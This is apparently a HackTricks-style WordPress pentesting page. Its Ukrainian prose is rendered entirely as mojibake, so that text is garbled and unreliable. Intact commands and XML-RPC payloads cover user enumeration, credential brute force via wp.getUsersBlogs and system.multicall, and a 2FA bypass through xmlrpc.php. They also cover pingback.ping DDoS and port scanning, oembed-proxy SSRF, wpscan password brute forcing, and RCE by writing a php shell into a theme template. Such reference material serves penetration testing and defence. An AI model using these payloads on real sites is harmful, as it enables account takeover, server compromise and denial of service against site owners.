# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- –£ —Ñ–∞–π–ª—ñ **wp-config.php** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ root-–ø–∞—Ä–æ–ª—å –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.
- –¢–∏–ø–æ–≤—ñ —à–ª—è—Ö–∏ –¥–ª—è –≤—Ö–æ–¥—É, —è–∫—ñ –≤–∞—Ä—Ç–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **–û—Å–Ω–æ–≤–Ω—ñ —Ñ–∞–π–ª–∏ WordPress**

- `index.php`
- `license.txt` –º—ñ—Å—Ç–∏—Ç—å –∫–æ—Ä–∏—Å–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ –≤–µ—Ä—Å—ñ—é –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ–≥–æ WordPress.
- `wp-activate.php` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–æ email –ø—Ä–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ –Ω–æ–≤–æ–≥–æ —Å–∞–π—Ç—É WordPress.
- –ü–∞–ø–∫–∏ –≤—Ö–æ–¥—É (–º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω—ñ, —â–æ–± —Å—Ö–æ–≤–∞—Ç–∏ —ó—Ö):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ‚Äî —Ñ–∞–π–ª, —è–∫–∏–π —Ä–µ–∞–ª—ñ–∑—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø–µ—Ä–µ–¥–∞—á—ñ –¥–∞–Ω–∏—Ö —á–µ—Ä–µ–∑ HTTP –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º XML —è–∫ –º–µ—Ö–∞–Ω—ñ–∑–º—É –∫–æ–¥—É–≤–∞–Ω–Ω—è. –¶–µ–π —Ç–∏–ø –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó –±—É–≤ –∑–∞–º—ñ–Ω–µ–Ω–∏–π WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- –ü–∞–ø–∫–∞ `wp-content` ‚Äî –æ—Å–Ω–æ–≤–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è plugins —ñ themes.
- `wp-content/uploads/` ‚Äî –∫–∞—Ç–∞–ª–æ–≥, –∫—É–¥–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –±—É–¥—å-—è–∫—ñ —Ñ–∞–π–ª–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É.
- `wp-includes/` ‚Äî –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è core-—Ñ–∞–π–ª–∏, —Ç–∞–∫—ñ —è–∫ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏, —à—Ä–∏—Ñ—Ç–∏, JavaScript-—Ñ–∞–π–ª–∏ —Ç–∞ –≤—ñ–¥–∂–µ—Ç–∏.
- `wp-sitemap.xml` ‚Äî —É –≤–µ—Ä—Å—ñ—è—Ö WordPress 5.5 —ñ –≤–∏—â–µ WordPress –≥–µ–Ω–µ—Ä—É—î sitemap XML –∑ —É—Å—ñ–º–∞ –ø—É–±–ª—ñ—á–Ω–∏–º–∏ –ø–æ—Å—Ç–∞–º–∏ —Ç–∞ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∏–º–∏ —Ç–∏–ø–∞–º–∏ –ø–æ—Å—Ç—ñ–≤ —ñ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—è–º–∏.

**Post exploitation**

- –§–∞–π–ª `wp-config.php` –º—ñ—Å—Ç–∏—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–µ–æ–±—Ö—ñ–¥–Ω—É WordPress –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ç–∞–∫—É —è–∫ –Ω–∞–∑–≤–∞ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ö–æ—Å—Ç –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—å, authentication keys and salts, —ñ –ø—Ä–µ—Ñ—ñ–∫—Å —Ç–∞–±–ª–∏—Ü—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö. –¶–µ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó DEBUG-—Ä–µ–∂–∏–º—É, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –ø—Ä–∏ —É—Å—É–Ω–µ–Ω–Ω—ñ –Ω–µ–ø–æ–ª–∞–¥–æ–∫.

### –ü—Ä–∞–≤–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

- **Administrator**
- **Editor**: –ü—É–±–ª—ñ–∫—É—î —ñ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ —Ç–∞ —á—É–∂–∏–º–∏ –ø–æ—Å—Ç–∞–º–∏
- **Author**: –ü—É–±–ª—ñ–∫—É—î —ñ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –≤–ª–∞—Å–Ω–∏–º–∏ –ø–æ—Å—Ç–∞–º–∏
- **Contributor**: –ü–∏—à–µ —ñ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –ø–æ—Å—Ç–∞–º–∏, –∞–ª–µ –Ω–µ –º–æ–∂–µ —ó—Ö –ø—É–±–ª—ñ–∫—É–≤–∞—Ç–∏
- **Subscriber**: –ü–µ—Ä–µ–≥–ª—è–¥–∞—î –ø–æ—Å—Ç–∏ —Ç–∞ —Ä–µ–¥–∞–≥—É—î —Å–≤—ñ–π –ø—Ä–æ—Ñ—ñ–ª—å

## **–ü–∞—Å–∏–≤–Ω–∞ —Ä–æ–∑–≤—ñ–¥–∫–∞**

### **–û—Ç—Ä–∏–º–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é WordPress**

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª–∏ `/license.txt` –∞–±–æ `/readme.html`

–£ **–≤–∏—Ö—ñ–¥–Ω–æ–º—É –∫–æ–¥—ñ** —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–ø—Ä–∏–∫–ª–∞–¥ –∑ [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link —Ñ–∞–π–ª–∏

![](<../../images/image (533).png>)

- JavaScript —Ñ–∞–π–ª–∏

![](<../../images/image (524).png>)

### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ —Ç–µ–º–∏
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–µ—Ä—Å—ñ–π –∑–∞–≥–∞–ª–æ–º
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## –ê–∫—Ç–∏–≤–Ω–∞ –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è

### –ü–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏

–ô–º–æ–≤—ñ—Ä–Ω–æ, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤—Å—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏. –©–æ–± –≤–∏—è–≤–∏—Ç–∏ –≤—Å—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∞–∫—Ç–∏–≤–Ω–æ Brute Force —Å–ø–∏—Å–æ–∫ –ø–ª–∞–≥—ñ–Ω—ñ–≤ —Ç–∞ —Ç–µ–º** (—Å–ø–æ–¥—ñ–≤–∞—î–º–æ—Å—å, –¥–ª—è –Ω–∞—Å —ñ—Å–Ω—É—é—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º—ñ—Å—Ç—è—Ç—å —Ü—ñ —Å–ø–∏—Å–∫–∏).

### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ

- **ID Brute:** –í–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ –¥—ñ–π—Å–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ —Å–∞–π—Ç—É WordPress —à–ª—è—Ö–æ–º Brute Forcing ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
–Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ ‚Äî **200** –∞–±–æ **30X**, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ id —î **–¥—ñ–π—Å–Ω–∏–º**. –Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å ‚Äî **400**, —Ç–æ id **–Ω–µ–¥—ñ–π—Å–Ω–∏–π**.

- **wp-json:** –í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∑—Ä–æ–±–∏–≤—à–∏ –∑–∞–ø–∏—Ç:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
–©–µ –æ–¥–∏–Ω `/wp-json/` endpoint, —è–∫–∏–π –º–æ–∂–µ —Ä–æ–∑–∫—Ä–∏—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —Ü–µ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **–ë—É–¥—É—Ç—å –Ω–∞–¥–∞–Ω—ñ –ª–∏—à–µ –≤—ñ–¥–æ–º–æ—Å—Ç—ñ –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —É —è–∫–∏—Ö —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è —É–≤—ñ–º–∫–Ω–µ–Ω–∞**.

Also note that **/wp-json/wp/v2/pages** could leak IP-–∞–¥—Ä–µ—Å–∏.

- **Login username enumeration**: –ü—ñ–¥ —á–∞—Å –≤—Ö–æ–¥—É —á–µ—Ä–µ–∑ **`/wp-login.php`** **–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è** —î **—Ä—ñ–∑–Ω–∏–º** —ñ –≤–∫–∞–∑—É—î, —á–∏ **username exists or not**.

### XML-RPC

–Ø–∫—â–æ `xml-rpc.php` –∞–∫—Ç–∏–≤–Ω–∏–π, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ credentials brute-force –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –∑–∞–ø—É—Å–∫—É DoS-–∞—Ç–∞–∫ –Ω–∞ —ñ–Ω—à—ñ —Ä–µ—Å—É—Ä—Å–∏. (–í–∏ –º–æ–∂–µ—Ç–µ –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ü–µ–π –ø—Ä–æ—Ü–µ—Å [using this](https://github.com/relarizky/wpxploit) –Ω–∞–ø—Ä–∏–∫–ª–∞–¥).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** –∞–±–æ **`metaWeblog.getUsersBlogs`** ‚Äî —Ü–µ –¥–µ—è–∫—ñ –º–µ—Ç–æ–¥–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è brute-force credentials. –Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –±—É–¥—å-—è–∫–∏–π –∑ –Ω–∏—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è _"Incorrect username or password"_ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ –∫–æ–¥–æ–º 200 –º–∞—î –∑'—è–≤–ª—è—Ç–∏—Å—è, —è–∫—â–æ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –Ω–µ–≤—ñ—Ä–Ω—ñ.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª. –£ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑'—è–≤–∏—Ç—å—Å—è —à–ª—è—Ö ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
–¢–∞–∫–æ–∂ —î **—à–≤–∏–¥—à–∏–π —Å–ø–æ—Å—ñ–±** –¥–ª—è brute-force credentials –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`system.multicall`** ‚Äî –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ credentials –≤ –æ–¥–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

–¶–µ–π –º–µ—Ç–æ–¥ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º, –∞ –Ω–µ –¥–ª—è –ª—é–¥–µ–π, —ñ —î –¥–∞–≤–Ω—ñ–º, —Ç–æ–º—É –≤—ñ–Ω –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î 2FA. –¢–æ–º—É, —è–∫—â–æ —É –≤–∞—Å —î –¥—ñ–π—Å–Ω—ñ creds, –∞–ª–µ –æ—Å–Ω–æ–≤–Ω–∏–π –≤—Ö—ñ–¥ –∑–∞—Ö–∏—â–µ–Ω–æ 2FA, **–≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ xmlrpc.php, —â–æ–± —É–≤—ñ–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü–∏—Ö creds, –æ–±—Ö–æ–¥—è—á–∏ 2FA**. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å—ñ –¥—ñ—ó, —è–∫—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ –∫–æ–Ω—Å–æ–ª—å, –∞–ª–µ –≤–∏ –≤—Å–µ –æ–¥–Ω–æ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, —è–∫ –ø–æ—è—Å–Ω—é—î Ippsec –≤ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –º–µ—Ç–æ–¥ _**pingback.ping**_ —É —Å–ø–∏—Å–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ Wordpress –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç –Ω–∞ –±—É–¥—å-—è–∫–∏–π —Ö–æ—Å—Ç/–ø–æ—Ä—Ç.\
–¶–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **—Ç–∏—Å—è—á—ñ** Wordpress **—Å–∞–π—Ç—ñ–≤** –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –æ–¥–Ω–æ–≥–æ **–º—ñ—Å—Ü—è** (–≤–Ω–∞—Å–ª—ñ–¥–æ–∫ —á–æ–≥–æ —Ç–∞–º —Å–ø—Ä–∏—á–∏–Ω–∏—Ç—å—Å—è **DDoS**) –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ, —â–æ–± –∑–º—É—Å–∏—Ç–∏ Wordpress scan –¥–µ—è–∫—É –≤–Ω—É—Ç—Ä—ñ—à–Ω—é **network** (–≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –ø–æ—Ä—Ç).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ **faultCode** –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º **–±—ñ–ª—å—à–∏–º**, –Ω—ñ–∂ **0** (17), —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –ø–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π.

–ü–æ–≥–ª—è–Ω—å—Ç–µ –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`system.multicall`** —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –º–µ—Ç–æ–¥–æ–º –¥–ª—è —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

–¶–µ–π —Ñ–∞–π–ª –∑–∞–∑–≤–∏—á–∞–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –∫–æ—Ä–µ–Ω—ñ —Å–∞–π—Ç—É Wordpress: **`/wp-cron.php`**\
–ö–æ–ª–∏ –¥–æ —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É **–∑–≤–µ—Ä—Ç–∞—é—Ç—å—Å—è**, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è **¬´–≤–∞–∂–∫–∏–π¬ª** MySQL **–∑–∞–ø–∏—Ç**, —Ç–æ–º—É –π–æ–≥–æ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏** —â–æ–± **—Å–ø—Ä–∏—á–∏–Ω–∏—Ç–∏** **DoS**.\
–¢–∞–∫–æ–∂, –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, `wp-cron.php` –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–∫–æ–ª–∏ –∫–ª—ñ—î–Ω—Ç –∑–∞–ø–∏—Ç—É—î –±—É–¥—å-—è–∫—É Wordpress —Å—Ç–æ—Ä—ñ–Ω–∫—É), —â–æ –Ω–∞ —Å–∞–π—Ç–∞—Ö –∑ –≤–µ–ª–∏–∫–∏–º —Ç—Ä–∞—Ñ—ñ–∫–æ–º –º–æ–∂–µ —Å–ø—Ä–∏—á–∏–Ω–∏—Ç–∏ –ø—Ä–æ–±–ª–µ–º–∏ (DoS).

–†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–º–∫–Ω—É—Ç–∏ Wp-Cron —ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ä–µ–∞–ª—å–Ω–∏–π cronjob –Ω–∞ —Ö–æ—Å—Ç—ñ, —è–∫–∏–π –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏–º–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥—ñ—ó –∑ —Ä–µ–≥—É–ª—è—Ä–Ω–∏–º —ñ–Ω—Ç–µ—Ä–≤–∞–ª–æ–º (–±–µ–∑ —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º).

### /wp-json/oembed/1.0/proxy - SSRF

–°–ø—Ä–æ–±—É–π—Ç–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ —ñ Worpress site –º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ –≤–∞—Å.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

–¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –ø—Ä–∏—Å—É—Ç–Ω—ñ–π **methodName: pingback.ping** —Ç–∞ —à–ª—è—Ö **/wp-json/oembed/1.0/proxy**, —ñ —è–∫—â–æ –≤–æ–Ω–∏ —ñ—Å–Ω—É—é—Ç—å, –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è —ó—Ö –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## –û—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø, –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–≤—à–∏ –±—ñ—Ç

–ë—ñ–ª—å—à–µ —Ü–µ —Ü—ñ–∫–∞–≤—ñ—Å—Ç—å, –Ω—ñ–∂ —Ä–µ–∞–ª—å–Ω–∞ –∞—Ç–∞–∫–∞. –£ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man] –º–æ–∂–Ω–∞ –±—É–ª–æ –ø–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç–∏ 1 –±—ñ—Ç —É –±—É–¥—å-—è–∫–æ–º—É wordpress —Ñ–∞–π–ª—ñ. –¢–æ–∂ –º–æ–∂–Ω–∞ –±—É–ª–æ –∑–º—ñ–Ω–∏—Ç–∏ –±—ñ—Ç –Ω–∞ –ø–æ–∑–∏—Ü—ñ—ó `5389` —É —Ñ–∞–π–ª—ñ `/var/www/html/wp-includes/user.php`, —â–æ–± –∑–∞–º—ñ–Ω–∏—Ç–∏ –æ–ø–µ—Ä–∞—Ü—ñ—é NOT (`!`) –Ω–∞ NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**–ó–º—ñ–Ω–∞ php-—Ñ–∞–π–ª—É —É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ–π —Ç–µ–º—ñ (admin credentials needed)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (–ø—Ä–∞–≤–æ—Ä—É—á)

–ó–∞–º—ñ–Ω—ñ—Ç—å –≤–º—ñ—Å—Ç –Ω–∞ php shell:

![](<../../images/image (384).png>)

